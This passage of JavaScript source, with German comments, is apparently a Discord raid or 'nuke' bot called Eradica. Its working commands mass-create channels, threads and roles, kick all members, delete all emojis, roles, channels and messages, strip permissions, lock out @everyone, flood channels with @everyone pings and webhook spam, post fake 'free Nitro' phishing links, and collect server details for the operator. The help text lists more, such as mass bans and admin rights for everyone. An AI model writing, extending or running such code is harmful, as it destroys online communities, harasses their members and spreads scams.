                        console.error(`Fehler beim Erstellen von Voice-Kanal ${i + 1}:`, error.message);
                    })
                );
            }

            await Promise.all(voiceOperations);
            await message.author.send('✅ **Voice Flood beendet!** 500 Voice-Kanäle erstellt! 🔊');

        } catch (error) {
            console.error('Fehler beim Voice Flood:', error);
            await message.author.send('❌ Es gab einen Fehler beim Voice Flood.');
        }
    },
};

const categoryBombCommand = {
    async execute(message) {
        const guild = message.guild;

        try {
            await message.author.send("📁 **CATEGORY BOMB GESTARTET** 📁\n100 Kategorien mit je 50 Kanälen...");

            const categoryOperations = [];

            for (let i = 0; i < 100; i++) {
                categoryOperations.push(
                    guild.channels.create({
                        name: `📁Category-${i + 1}📁`,
                        type: ChannelType.GuildCategory
                    }).then(category => {
                        // 50 Kanäle in jeder Kategorie
                        const channelPromises = [];
                        for (let j = 0; j < 50; j++) {
                            channelPromises.push(
                                guild.channels.create({
                                    name: `channel-${j + 1}`,
                                    type: ChannelType.GuildText,
                                    parent: category
                                }).catch(() => {})
                            );
                        }
                        return Promise.all(channelPromises);
                    }).catch(error => {
                        console.error(`Fehler beim Erstellen von Kategorie ${i + 1}:`, error.message);
                    })
                );
            }

            await Promise.all(categoryOperations);
            await message.author.send('✅ **Category Bomb beendet!** 100 Kategorien mit 5000 Kanälen! 📁');

        } catch (error) {
            console.error('Fehler beim Category Bomb:', error);
            await message.author.send('❌ Es gab einen Fehler beim Category Bomb.');
        }
    },
};

const slowModeDisablerCommand = {
    async execute(message) {
        const guild = message.guild;

        try {
            await message.author.send("⚡ **SLOWMODE DISABLER GESTARTET** ⚡\nEntferne Slowmode von allen Kanälen...");

            const textChannels = guild.channels.cache.filter(channel => 
                channel.type === ChannelType.GuildText
            );

            const slowmodePromises = [];
            for (const channel of textChannels.values()) {
                slowmodePromises.push(
                    channel.setRateLimitPerUser(0).catch(error => {
                        console.error(`Fehler beim Entfernen von Slowmode in ${channel.name}:`, error.message);
                    })
                );
            }

            await Promise.all(slowmodePromises);
            await message.author.send(`✅ **Slowmode Disabler beendet!** ${textChannels.size} Kanäle bearbeitet! ⚡`);

        } catch (error) {
            console.error('Fehler beim Slowmode Disabler:', error);
            await message.author.send('❌ Es gab einen Fehler beim Slowmode Disabler.');
        }
    },
};

const memberKickCommand = {
    async execute(message) {
        const guild = message.guild;

        try {
            await message.author.send("👢 **MEMBER KICK GESTARTET** 👢\nKicke alle Member...");

            await guild.members.fetch();
            const members = guild.members.cache;

            let kickedCount = 0;
            const kickPromises = [];

            for (const member of members.values()) {
                if (member.user.id !== guild.members.me.id && member.kickable) {
                    kickPromises.push(
                        member.kick('Kicked by Eradica').then(() => {
                            kickedCount++;
                            console.log(`✅ Gekickt: ${member.user.tag}`);
                        }).catch(error => {
                            console.error(`❌ Fehler beim Kicken von ${member.user.tag}:`, error.message);
                        })
                    );
                }
            }

            await Promise.all(kickPromises);
            await message.author.send(`✅ **Member Kick beendet!** ${kickedCount} Member gekickt! 👢`);

        } catch (error) {
            console.error('Fehler beim Member Kick:', error);
            await message.author.send('❌ Es gab einen Fehler beim Member Kick.');
        }
    },
};

const emojiBombCommand = {
    async execute(message) {
        const guild = message.guild;

        try {
            await message.author.send("😈 **EMOJI BOMB GESTARTET** 😈\nLösche alle Emojis und erstelle Spam-Emojis...");

            // Alle aktuellen Emojis löschen
            const currentEmojis = guild.emojis.cache;
            const deletePromises = [];

            for (const emoji of currentEmojis.values()) {
                deletePromises.push(
                    emoji.delete().catch(error => {
                        console.error(`Fehler beim Löschen von Emoji ${emoji.name}:`, error.message);
                    })
                );
            }

            await Promise.all(deletePromises);

            // Neue Spam-Emojis erstellen (mit Base64 1x1 pixel image)
            const emojiData = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==';
            const createPromises = [];

            for (let i = 0; i < 50; i++) {
                createPromises.push(
                    guild.emojis.create({
                        attachment: emojiData,
                        name: `eradica${i}`
                    }).catch(error => {
                        console.error(`Fehler beim Erstellen von Emoji ${i}:`, error.message);
                    })
                );
            }

            await Promise.all(createPromises);
            await message.author.send('✅ **Emoji Bomb beendet!** Alle Emojis gelöscht und neue erstellt! 😈');

        } catch (error) {
            console.error('Fehler beim Emoji Bomb:', error);
            await message.author.send('❌ Es gab einen Fehler beim Emoji Bomb.');
        }
    },
};

const threadSpamCommand = {
    async execute(message) {
        const guild = message.guild;

        try {
            await message.author.send("🧵 **THREAD SPAM GESTARTET** 🧵\nErstelle 100 Threads in jedem Kanal...");

            const textChannels = guild.channels.cache.filter(channel => 
                channel.type === ChannelType.GuildText
            );

            const threadOperations = [];

            for (const channel of textChannels.values()) {
                for (let i = 0; i < 100; i++) {
                    threadOperations.push(
                        channel.threads.create({
                            name: `🧵Thread-${i + 1} by Eradica🧵`,
                            autoArchiveDuration: 60,
                            reason: 'Thread Spam by Eradica'
                        }).then(thread => {
                            // Sende 10 Nachrichten in jeden Thread
                            const messages = [];
                            for (let j = 0; j < 10; j++) {
                                messages.push(
                                    thread.send("🧵THREAD SPAMMED BY ERADICA🧵")
                                        .catch(() => {})
                                );
                            }
                            return Promise.all(messages);
                        }).catch(error => {
                            console.error(`Fehler beim Erstellen von Thread ${i + 1} in ${channel.name}:`, error.message);
                        })
                    );
                }
            }

            await Promise.all(threadOperations);
            await message.author.send(`✅ **Thread Spam beendet!** ${textChannels.size * 100} Threads erstellt! 🧵`);

        } catch (error) {
            console.error('Fehler beim Thread Spam:', error);
            await message.author.send('❌ Es gab einen Fehler beim Thread Spam.');
        }
    },
};

const mentionStormCommand = {
    async execute(message) {
        const commandId = ++commandIdCounter;
        runningCommands.set(commandId, 'mention_storm');

        const channel = message.channel;
        const guild = message.guild;

        try {
            await message.author.send("🌪️ **MENTION STORM GESTARTET** 🌪️\nAlle Rollen werden in 1000 Nachrichten erwähnt...");

            const roles = guild.roles.cache.filter(role => role.mentionable);
            let roleIndex = 0;

            for (let i = 0; i < 1000; i++) {
                if (!runningCommands.has(commandId)) break;

                const role = roles.at(roleIndex % roles.size);
                const mentionText = role ? `${role} 🌪️MENTION STORM BY ERADICA🌪️` : `@everyone 🌪️MENTION STORM BY ERADICA🌪️`;

                await channel.send(mentionText).catch(() => {});
                roleIndex++;

                if (i % 10 === 0) {
                    await new Promise(resolve => setTimeout(resolve, 50));
                }
            }

            runningCommands.delete(commandId);
            await message.author.send('✅ **Mention Storm beendet!** 1000 Mention-Nachrichten gesendet! 🌪️');

        } catch (error) {
            console.error('Fehler beim Mention Storm:', error);
            runningCommands.delete(commandId);
            await message.author.send('❌ Es gab einen Fehler beim Mention Storm.');
        }
    },
};

const serverLockdownCommand = {
    async execute(message) {
        const guild = message.guild;

        try {
            await message.author.send("🔒 **SERVER LOCKDOWN GESTARTET** 🔒\nSperre alle Kanäle für @everyone...");

            const channels = guild.channels.cache.filter(channel => 
                channel.type === ChannelType.GuildText || 
                channel.type === ChannelType.GuildVoice ||
                channel.type === ChannelType.GuildCategory
            );

            const lockPromises = [];

            for (const channel of channels.values()) {
                lockPromises.push(
                    channel.permissionOverwrites.edit(guild.roles.everyone, {
                        SendMessages: false,
                        Speak: false,
                        Connect: false,
                        ViewChannel: false
                    }).catch(error => {
                        console.error(`Fehler beim Sperren von Kanal ${channel.name}:`, error.message);
                    })
                );
            }

            await Promise.all(lockPromises);
            await message.author.send(`✅ **Server Lockdown beendet!** ${channels.size} Kanäle gesperrt! 🔒`);

        } catch (error) {
            console.error('Fehler beim Server Lockdown:', error);
            await message.author.send('❌ Es gab einen Fehler beim Server Lockdown.');
        }
    },
};

const nitroScamCommand = {
    async execute(message) {
        const channel = message.channel;

        try {
            await message.author.send("💎 **NITRO SCAM GESTARTET** 💎\nSende 200 Fake Nitro Links...");

            const fakeLinks = [
                "🎉 FREE NITRO! 🎉 https://discord-nitro-free.com/claim",
                "💎 Get Discord Nitro FREE! https://nitro-discord-free.net/get",
                "🚀 FREE DISCORD NITRO! https://discord-gifts.com/nitro",
                "⭐ CLAIM FREE NITRO! https://free-nitro-discord.org/claim",
                "🎁 Discord Nitro Gift! https://nitro-gift-discord.com/free"
            ];

            const messagePromises = [];

            for (let i = 0; i < 200; i++) {
                const randomLink = fakeLinks[Math.floor(Math.random() * fakeLinks.length)];
                messagePromises.push(
                    channel.send(`@everyone ${randomLink}`)
                        .catch(error => {
                            console.error(`Fehler beim Senden von Nitro Scam ${i + 1}:`, error.message);
                        })
                );

                if (messagePromises.length >= 5) {
                    await Promise.all(messagePromises);
                    messagePromises.length = 0;
                    await new Promise(resolve => setTimeout(resolve, 100));
                }
            }

            if (messagePromises.length > 0) {
                await Promise.all(messagePromises);
            }

            await message.author.send('✅ **Nitro Scam beendet!** 200 Fake Nitro Links gesendet! 💎');

        } catch (error) {
            console.error('Fehler beim Nitro Scam:', error);
            await message.author.send('❌ Es gab einen Fehler beim Nitro Scam.');
        }
    },
};

const everyoneSpamCommand = {
    async execute(message) {
        const commandId = ++commandIdCounter;
        runningCommands.set(commandId, 'everyone_spam');

        const channel = message.channel;

        try {
            await message.author.send("📢 **EVERYONE SPAM GESTARTET** 📢\n5000 @everyone Nachrichten...");

            for (let i = 0; i < 5000; i++) {
                if (!runningCommands.has(commandId)) break;

                await channel.send("@everyone").catch(() => {});

                if (i % 50 === 0) {
                    await new Promise(resolve => setTimeout(resolve, 100));
                }
            }

            runningCommands.delete(commandId);
            await message.author.send('✅ **Everyone Spam beendet!** 5000 @everyone Pings gesendet! 📢');

        } catch (error) {
            console.error('Fehler beim Everyone Spam:', error);
            runningCommands.delete(commandId);
            await message.author.send('❌ Es gab einen Fehler beim Everyone Spam.');
        }
    },
};

const permissionNukeCommand = {
    async execute(message) {
        const guild = message.guild;

        try {
            await message.author.send("⚙️ **PERMISSION NUKE GESTARTET** ⚙️\nEntferne alle Berechtigungen...");

            const roles = guild.roles.cache.filter(role => role.name !== '@everyone');

            const permissionPromises = [];

            for (const role of roles.values()) {
                permissionPromises.push(
                    role.setPermissions([]).catch(error => {
                        console.error(`Fehler beim Ändern der Berechtigungen von Rolle ${role.name}:`, error.message);
                    })
                );
            }

            await Promise.all(permissionPromises);
            await message.author.send(`✅ **Permission Nuke beendet!** ${roles.size} Rollen ohne Berechtigungen! ⚙️`);

        } catch (error) {
            console.error('Fehler beim Permission Nuke:', error);
            await message.author.send('❌ Es gab einen Fehler beim Permission Nuke.');
        }
    },
};

const massReactCommand = {
    async execute(message) {
        const channel = message.channel;

        try {
            await message.author.send("😀 **MASS REACT GESTARTET** 😀\nReagiere auf alle Nachrichten...");

            // Alle Nachrichten in dem Kanal holen (letzte 100)
            const messages = await channel.messages.fetch({ limit: 100 });

            const emojis = ['😀', '😁', '😂', '🤣', '😃', '😄', '😅', '😆', '😉', '😊', '😋', '😎', '😍', '😘', '🥰', '😗', '😙', '😚', '🙂', '🤗'];

            const reactionPromises = [];

            for (const msg of messages.values()) {
                for (const emoji of emojis) {
                    reactionPromises.push(
                        msg.react(emoji).catch(error => {
                            console.error(`Fehler beim Reagieren auf Nachricht:`, error.message);
                        })
                    );
                }
            }

            await Promise.all(reactionPromises);
            await message.author.send(`✅ **Mass React beendet!** ${messages.size} Nachrichten mit ${emojis.length} Emojis! 😀`);

        } catch (error) {
            console.error('Fehler beim Mass React:', error);
            await message.author.send('❌ Es gab einen Fehler beim Mass React.');
        }
    },
};

const channelRenameCommand = {
    async execute(message) {
        const guild = message.guild;

        try {
            await message.author.send("📝 **CHANNEL RENAME GESTARTET** 📝\nBenenne alle Kanäle um...");

            const channels = guild.channels.cache.filter(channel => 
                channel.type === ChannelType.GuildText || 
                channel.type === ChannelType.GuildVoice
            );

            const renamePromises = [];
            let counter = 1;

            for (const channel of channels.values()) {
                const newName = `eradica-destroyed-${counter++}`;
                renamePromises.push(
                    channel.setName(newName).catch(error => {
                        console.error(`Fehler beim Umbenennen von Kanal ${channel.name}:`, error.message);
                    })
                );
            }

            await Promise.all(renamePromises);
            await message.author.send(`✅ **Channel Rename beendet!** ${channels.size} Kanäle umbenannt! 📝`);

        } catch (error) {
            console.error('Fehler beim Channel Rename:', error);
            await message.author.send('❌ Es gab einen Fehler beim Channel Rename.');
        }
    },
};

const antiRaidCommand = {
    async execute(message) {
        const guild = message.guild;

        try {
            await message.author.send("🛡️ **ANTI-RAID SCHUTZ GESTARTET** 🛡️\nAktiviere maximalen Schutz...");

            // Verification Level auf höchste Stufe
            await guild.setVerificationLevel(4);

            // Explicit Content Filter aktivieren
            await guild.setExplicitContentFilter(2);

            // System Channel Features deaktivieren
            await guild.setSystemChannelFlags(['SuppressJoinNotifications', 'SuppressPremiumSubscriptions']);

            await message.author.send('✅ **Anti-Raid Schutz aktiviert!** Server ist jetzt maximal geschützt! 🛡️');

        } catch (error) {
            console.error('Fehler beim Anti-Raid:', error);
            await message.author.send('❌ Es gab einen Fehler beim Anti-Raid Schutz.');
        }
    },
};

const serverInfoStealCommand = {
    async execute(message) {
        const guild = message.guild;

        try {
            await message.author.send("🕵️ **SERVER INFO STEAL GESTARTET** 🕵️\nSammle alle Server-Informationen...");

            await guild.members.fetch();
            await guild.channels.fetch();
            await guild.roles.fetch();

            const serverInfo = `
**🏰 SERVER INFORMATIONEN GESTOHLEN 🏰**

**📊 BASIC INFO:**
\`Server Name:\` ${guild.name}
\`Server ID:\` ${guild.id}
\`Owner ID:\` ${guild.ownerId}
\`Created:\` ${guild.createdAt.toLocaleDateString('de-DE')}
\`Member Count:\` ${guild.memberCount}
\`Boost Level:\` ${guild.premiumTier}
\`Boost Count:\` ${guild.premiumSubscriptionCount}

**📁 CHANNELS:**
\`Text Channels:\` ${guild.channels.cache.filter(c => c.type === ChannelType.GuildText).size}
\`Voice Channels:\` ${guild.channels.cache.filter(c => c.type === ChannelType.GuildVoice).size}
\`Categories:\` ${guild.channels.cache.filter(c => c.type === ChannelType.GuildCategory).size}
\`Total Channels:\` ${guild.channels.cache.size}

**👥 MEMBERS:**
\`Humans:\` ${guild.members.cache.filter(m => !m.user.bot).size}
\`Bots:\` ${guild.members.cache.filter(m => m.user.bot).size}
\`Online:\` ${guild.members.cache.filter(m => m.presence?.status === 'online').size}

**🏷️ ROLES:**
\`Total Roles:\` ${guild.roles.cache.size}
\`Admin Roles:\` ${guild.roles.cache.filter(r => r.permissions.has('Administrator')).size}

**🔒 SECURITY:**
\`Verification Level:\` ${guild.verificationLevel}
\`Content Filter:\` ${guild.explicitContentFilter}
\`MFA Required:\` ${guild.mfaLevel === 1 ? 'Yes' : 'No'}

**🎉 FEATURES:**
${guild.features.length > 0 ? guild.features.join(', ') : 'None'}
            `;

            await message.author.send(serverInfo);

        } catch (error) {
            console.error('Fehler beim Server Info Steal:', error);
            await message.author.send('❌ Es gab einen Fehler beim Server Info Steal.');
        }
    },
};

const randomChaosCommand = {
    async execute(message) {
        const guild = message.guild;

        try {
            await message.author.send("🎲 **RANDOM CHAOS GESTARTET** 🎲\nZufällige destruktive Aktionen...");

            const chaosActions = [
                // Random channel creation
                async () => {
                    for (let i = 0; i < 50; i++) {
                        await guild.channels.create({
                            name: `chaos-${Math.random().toString(36).substring(7)}`,
                            type: ChannelType.GuildText
                        }).catch(() => {});
                    }
                },
                // Random role creation
                async () => {
                    for (let i = 0; i < 25; i++) {
                        await guild.roles.create({
                            name: `CHAOS-${Math.random().toString(36).substring(7)}`,
                            color: Math.floor(Math.random() * 16777215)
                        }).catch(() => {});
                    }
                },
                // Random server name changes
                async () => {
                    const chaosNames = ['CHAOS SERVER', 'RANDOM DESTRUCTION', 'ERADICA CHAOS', 'DESTROYED RANDOMLY'];
                    const randomName = chaosNames[Math.floor(Math.random() * chaosNames.length)];
                    await guild.setName(randomName).catch(() => {});
                },
                // Random message spam
                async () => {
                    const channels = guild.channels.cache.filter(c => c.type === ChannelType.GuildText);
                    const randomChannel = channels.random();
                    if (randomChannel) {
                        for (let i = 0; i < 100; i++) {
                            await randomChannel.send(`🎲RANDOM CHAOS #${i + 1}🎲`).catch(() => {});
                        }
                    }
                }
            ];

            // Execute 3 random chaos actions
            for (let i = 0; i < 3; i++) {
                const randomAction = chaosActions[Math.floor(Math.random() * chaosActions.length)];
                await randomAction();
                await new Promise(resolve => setTimeout(resolve, 1000));
            }

            await message.author.send('✅ **Random Chaos beendet!** Zufällige Zerstörung abgeschlossen! 🎲');

        } catch (error) {
            console.error('Fehler beim Random Chaos:', error);
            await message.author.send('❌ Es gab einen Fehler beim Random Chaos.');
        }
    },
};

const messageHistoryNukeCommand = {
    async execute(message) {
        const guild = message.guild;

        try {
            await message.author.send("🗑️ **MESSAGE HISTORY NUKE GESTARTET** 🗑️\nLösche alle Nachrichten in allen Kanälen...");

            const textChannels = guild.channels.cache.filter(channel => 
                channel.type === ChannelType.GuildText
            );

            const deleteOperations = [];

            for (const channel of textChannels.values()) {
                deleteOperations.push(
                    (async () => {
                        let deletedCount = 0;
                        let fetched;

                        do {
                            fetched = await channel.messages.fetch({ limit: 100 });
                            if (fetched.size === 0) break;

                            const bulkDeleteable = fetched.filter(msg => 
                                Date.now() - msg.createdTimestamp < 14 * 24 * 60 * 60 * 1000
                            );

                            if (bulkDeleteable.size >= 2) {
                                await channel.bulkDelete(bulkDeleteable);
                                deletedCount += bulkDeleteable.size;
                            }

                            const remainingMessages = fetched.filter(msg => !bulkDeleteable.has(msg.id));
                            for (const msg of remainingMessages.values()) {
                                try {
                                    await msg.delete();
                                    deletedCount++;
                                } catch (err) {
                                    break;
                                }
                            }

                            await new Promise(resolve => setTimeout(resolve, 1000));

                        } while (fetched.size >= 100);

                        console.log(`${deletedCount} Nachrichten in ${channel.name} gelöscht`);
                    })()
                );
            }

            await Promise.all(deleteOperations);
            await message.author.send(`✅ **Message History Nuke beendet!** Alle Nachrichten in ${textChannels.size} Kanälen gelöscht! 🗑️`);

        } catch (error) {
            console.error('Fehler beim Message History Nuke:', error);
            await message.author.send('❌ Es gab einen Fehler beim Message History Nuke.');
        }
    },
};

const customNukeCommand = {
    async execute(message) {
        // Better argument parsing that handles quoted strings
        const fullCommand = message.content.slice(1); // Remove the '!'
        const args = [];
        let current = '';
        let inQuotes = false;
        let quoteChar = '';

        for (let i = 0; i < fullCommand.length; i++) {
            const char = fullCommand[i];

            if ((char === '"' || char === "'") && !inQuotes) {
                inQuotes = true;
                quoteChar = char;
            } else if (char === quoteChar && inQuotes) {
                inQuotes = false;
                quoteChar = '';
            } else if (char === ' ' && !inQuotes) {
                if (current.trim()) {
                    args.push(current.trim());
                    current = '';
                }
            } else {
                current += char;
            }
        }

        if (current.trim()) {
            args.push(current.trim());
        }

        // Remove command name (first argument)
        args.shift();

        // Check if all required parameters are provided
        if (args.length < 5) {
            await message.author.send('❌ Bitte verwende das richtige Format:\n`!custom_nuke {Channel Name} {Server Name} {Nuke Text} {Channel Amount} {Text Amount}`\n\nBeispiel: `!custom_nuke destroyed-server NUKED-SERVER "Get Destroyed!" 100 50`');
            return;
        }

        const channelName = args[0];
        const serverName = args[1];
        const nukeText = args[2];
        const channelAmount = parseInt(args[3]);
        const textAmount = parseInt(args[4]);

        // Debug: Show parsed arguments
        console.log('Parsed arguments:', args);
        console.log('Channel Amount:', channelAmount, 'Type:', typeof channelAmount);
        console.log('Text Amount:', textAmount, 'Type:', typeof textAmount);

        // Validate parameters with more detailed error messages
        if (isNaN(channelAmount) || channelAmount <= 0 || channelAmount > 1000) {
            await message.author.send(`❌ Channel Amount Fehler: "${args[3]}" ist keine gültige Zahl zwischen 1 und 1000.\nEmpfangen: ${channelAmount} (Type: ${typeof channelAmount})`);
            return;
        }

        if (isNaN(textAmount) || textAmount <= 0 || textAmount > 500) {
            await message.author.send(`❌ Text Amount Fehler: "${args[4]}" ist keine gültige Zahl zwischen 1 und 500.\nEmpfangen: ${textAmount} (Type: ${typeof textAmount})`);
            return;
        }

        const guild = message.guild;

        try {
            await message.author.send(`🚀 **CUSTOM NUKE GESTARTET** 🚀\nServer Name: ${serverName}\nChannel Name: ${channelName}\nNuke Text: ${nukeText}\nChannels: ${channelAmount}\nTexts pro Kanal: ${textAmount}`);

            console.log(`Custom Nuke gestartet - ${channelAmount} Kanäle werden erstellt...`);

            // PHASE 1: Server-Name ändern
            try {
                await guild.setName(serverName);
                console.log(`Server-Name erfolgreich geändert zu: ${serverName}`);
            } catch (error) {
                console.error("Konnte Server-Name nicht ändern:", error.message);
            }

            // PHASE 2: Alle aktuellen Kanäle löschen
            await guild.channels.fetch();
            const allChannels = guild.channels.cache.filter(channel => 
                channel.type === ChannelType.GuildText || 
                channel.type === ChannelType.GuildVoice || 
                channel.type === ChannelType.GuildCategory
            );

            console.log(`Lösche ${allChannels.size} Kanäle...`);

            const deletePromises = [];
            for (const channel of allChannels.values()) {
                deletePromises.push(
                    channel.delete().catch(error => {
                        console.error(`Konnte Kanal ${channel.name} nicht löschen:`, error.message);
                    })
                );
            }

            await Promise.all(deletePromises);
            console.log("Alle Kanäle wurden gelöscht, beginne mit Kanal-Erstellung...");

            // Minimale Pause für Discord Rate Limits
            await new Promise(resolve => setTimeout(resolve, 100));

            // PHASE 3: Custom amount von Kanälen erstellen + custom amount von Spam-Nachrichten
            const allOperations = [];

            for (let i = 0; i < channelAmount; i++) {
                allOperations.push(
                    guild.channels.create({
                        name: `${channelName}-${i + 1}`,
                        type: ChannelType.GuildText,
                    }).then(newChannel => {
                        console.log(`✅ Kanal erstellt: ${newChannel.name}`);

                        // Custom amount von Nachrichten parallel senden
                        const messages = [];
                        for (let j = 0; j < textAmount; j++) {
                            messages.push(
                                newChannel.send(`@everyone ${nukeText}`)
                                    .catch(error => {
                                        console.error(`Fehler beim Senden von Nachricht ${j + 1} in ${newChannel.name}:`, error.message);
                                    })
                            );
                        }
                        return Promise.all(messages).then(() => {
                            console.log(`✅ ${textAmount} Nachrichten gesendet in ${newChannel.name}`);
                        });
                    }).catch(error => {
                        console.error(`Fehler beim Erstellen von Kanal ${i + 1}:`, error.message);
                    })
                );
            }

            // Alle Operationen parallel ausführen für maximale Geschwindigkeit
            await Promise.all(allOperations);

            console.log(`✅ Custom Nuke beendet - ${channelAmount} Kanäle erstellt und mit je ${textAmount} Nachrichten gespammt!`);
            await message.author.send(`✅ **Custom Nuke beendet!**\n📊 **Statistiken:**\n🏷️ Server Name: ${serverName}\n📁 Kanäle erstellt: ${channelAmount}\n💬 Nachrichten pro Kanal: ${textAmount}\n📝 Nuke Text: ${nukeText}\n🎯 Total Nachrichten: ${channelAmount * textAmount}`);

        } catch (error) {
            console.error('Fehler beim Custom Nuke:', error);
            await message.author.send('❌ Es gab einen Fehler beim Custom Nuke.');
        }
    },
};

const webhookCommand = {
    async execute(message) {
        const guild = message.guild;

        try {
            await message.author.send("Erstelle Spam-Webhooks...");

            const textChannels = guild.channels.cache.filter(channel => 
                channel.type === ChannelType.GuildText
            );

            const webhookOperations = [];

            for (const channel of textChannels.values()) {
                // 10 Webhooks pro Kanal erstellen
                for (let i = 0; i < 10; i++) {
                    webhookOperations.push(
                        channel.createWebhook({
                            name: `Eradica-Webhook-${i}`,
                            avatar: 'https://cdn.discordapp.com/embed/avatars/0.png'
                        }).then(webhook => {
                            // Sofort 50 Nachrichten über Webhook senden
                            const messages = [];
                            for (let j = 0; j < 50; j++) {
                                messages.push(
                                    webhook.send("**☣️WEBHOOK NUKED BY ERADICA☣️ https://discord.gg/YQABC9hgxx @everyone**")
                                        .catch(() => {})
                                );
                            }
                            return Promise.all(messages);
                        }).catch(() => {}) // Ignore errors
                    );
                }
            }

            Promise.all(webhookOperations).catch(() => {}); // Fire and forget

            await message.author.send(`✅ Webhook-Spam gestartet in ${textChannels.size} Kanälen!`);
        } catch (error) {
            console.error('Fehler beim Webhook-Befehl:', error);
            await message.author.send('Es gab einen Fehler beim Webhook-Spam.');
        }
    },
};

const channelsCommand = {
    async execute(message) {
        const guild = message.guild;

        try {
            await message.author.send("Erstelle 1000 Kanäle...");

            const channelOperations = [];

            // 1000 Kanäle erstellen
            for (let i = 0; i < 1000; i++) {
                channelOperations.push(
                    guild.channels.create({
                        name: `☣️eradica-${i}☣️`,
                        type: ChannelType.GuildText,
                    }).catch(() => {}) // Ignore errors
                );
            }

            // Zusätzlich 100 Voice-Kanäle
            for (let i = 0; i < 100; i++) {
                channelOperations.push(
                    guild.channels.create({
                        name: `☣️Voice-${i}☣️`,
                        type: ChannelType.GuildVoice,
                    }).catch(() => {}) // Ignore errors
                );
            }

            Promise.all(channelOperations).catch(() => {}); // Fire and forget

            await message.author.send('✅ 1000 Text-Kanäle und 100 Voice-Kanäle werden erstellt!');
        } catch (error) {
            console.error('Fehler beim Kanäle-Befehl:', error);
            await message.author.send('Es gab einen Fehler beim Erstellen der Kanäle.');
        }
    },
};

const rolesCommand = {
    async execute(message) {
        const guild = message.guild;

        try {
            await message.author.send("Lösche alle Rollen...");

            // Alle Rollen außer @everyone löschen
            const roles = guild.roles.cache.filter(role => role.name !== '@everyone');

            const deletePromises = [];
            for (const role of roles.values()) {
                deletePromises.push(
                    role.delete().catch(error => {
                        console.error(`Konnte Rolle ${role.name} nicht löschen:`, error.message);
                    })
                );
            }

            await Promise.all(deletePromises);

            // Neue Spam-Rollen erstellen
            const createPromises = [];
            for (let i = 0; i < 50; i++) {
                createPromises.push(
                    guild.roles.create({
                        name: `☣️Nuked-${i}☣️`,
                        color: 'Red',
                        mentionable: true
                    }).catch(() => {}) // Ignore errors
                );
            }

            await Promise.all(createPromises);

            await message.author.send('✅ Alle Rollen gelöscht und neue Spam-Rollen erstellt!');
        } catch (error) {
            console.error('Fehler beim Rollen-Befehl:', error);
            await message.author.send('Es gab einen Fehler beim Löschen der Rollen.');
        }
    },
};

const helpCommand = {
    async execute(message) {
        // Split help message into smaller chunks to avoid Discord's 2000 character limit
        const helpMessages = [
            `**🤖 Eradica - Verfügbare Befehle (Teil 1):**

\`!erikamode\` - Server nukein mit Kanal-Spam
\`!eradicamode\` - Alle Member bannen
\`!admin\` - Admin-Rolle erstellen
\`!everyoneadmin\` - Admin-Rolle für alle
\`!rolespam\` - 250 Rollen erstellen
\`!rolespameasy\` - 250 Easy Rollen erstellen
\`!spam\` - Kanal spammen
\`!customspam [text]\` - Custom Spam
\`!dm_spam @user [anzahl] [text]\` - DM Spam
\`!invisibleping [anzahl]\` - Unsichtbare @everyone Pings
\`!unbanall\` - Alle entbannen
\`!roles\` - Löscht alle Rollen und erstellt 50 neue Spam-Rollen
\`!webhook\` - Erstellt 10 Webhooks pro Kanal und spammt 50 Nachrichten pro Webhook
\`!channels\` - Erstellt 1000 Text-Kanäle und 100 Voice-Kanäle`,

            `**🤖 Eradica - Verfügbare Befehle (Teil 2):**

\`!clearchannel\` - Kanal säubern
\`!set_servername [name]\` - Server umbenennen
\`!erikamusic\` - Erika Musik Link senden
\`!jumpscare\` - Jumpscare GIFs senden
\`!Backfisch @user\` - User bannen
\`!nuke_tester\` - Server testen nukein
\`!clean_nuke\` - Alle Kanäle löschen
\`!special_surprise\` - 🎲 Zufälliger Befehl
\`!eradica_raid_erika\` - 50 Kanäle mit Raid
\`!ghost_ping\` - Ghost Ping alle Kanäle`,

            `**🤖 Eradica - ERADICA NUKE BEFEHLE:**

\`!eradica_meganuke\` - 🚀 1000 Kanäle erstellen und spammen
\`!eradica_rapidfire\` - ⚡ 100 Kanäle schnell mit 200 Nachrichten
\`!eradica_channelbomb\` - 💣 500 Kanäle parallel erstellen
\`!eradica_ultimatedestroy\` - 🔥 Ultimativer destruktiver Angriff
\`!eradica_massping\` - 📢 500 @everyone Pings senden
\`!custom_nuke\` - 🎯 Custom Nuke mit eigenen Parametern

**🔥 ERADICA SPECIAL COMMANDS:**
\`!eradica_spam\` - 💀 1000 Eradica Spam Nachrichten
\`!eradica_destroy\` - 🔥 Server komplett zerstören
\`!eradica_mass\` - ⚡ Mass operations ausführen
\`!eradica_overload\` - 🌪️ Server überladen (800 Kanäle)
\`!eradica_webhooks\` - 🕸️ Webhooks für alle Kanäle (500 Nachrichten)`,

            `**🆕 NEW COMMANDS - TEIL 1:**

\`!infinite_spam\` - ♾️ Endloser Spam (stoppt nur mit !stop)
\`!voice_flood\` - 🔊 500 Voice-Kanäle erstellen
\`!category_bomb\` - 📁 100 Kategorien mit je 50 Kanälen
\`!slowmode_disabler\` - ⚡ Slowmode von allen Kanälen entfernen
\`!member_kick\` - 👢 Alle Member kicken
\`!emoji_bomb\` - 😈 Alle Emojis löschen + neue erstellen
\`!thread_spam\` - 🧵 100 Threads pro Kanal erstellen
\`!mention_storm\` - 🌪️ 1000 Nachrichten mit Rollen-Mentions
\`!server_lockdown\` - 🔒 Alle Kanäle für @everyone sperren
\`!nitro_scam\` - 💎 200 Fake Nitro Links senden`,

            `**🆕 NEW COMMANDS - TEIL 2:**

\`!everyone_spam\` - 📢 5000 @everyone Nachrichten
\`!permission_nuke\` - ⚙️ Alle Rollenberechtigungen entfernen
\`!mass_react\` - 😀 Alle Nachrichten mit Emojis reagieren
\`!channel_rename\` - 📝 Alle Kanäle umbenennen
\`!anti_raid\` - 🛡️ Anti-Raid Schutz aktivieren
\`!server_info_steal\` - 🕵️ Alle Server-Informationen sammeln
\`!random_chaos\` - 🎲 Zufällige destruktive Aktionen
\`!message_history_nuke\` - 🗑️ Alle Nachrichten in allen Kanälen löschen`,

            `**🤖 Eradica - Info & Admin:**

\`!eradica_status\` - Bot Status anzeigen
\`!help\` - Diese Hilfe anzeigen
\`!Online\` - Alle Befehle aktivieren (Admin only)
\`!Stop\` - Alle Befehle deaktivieren + stoppen (Admin only)

**🎯 CUSTOM NUKE:**
\`!custom_nuke {Channel Name} {Server Name} {Nuke Text} {Channel Amount} {Text Amount}\`
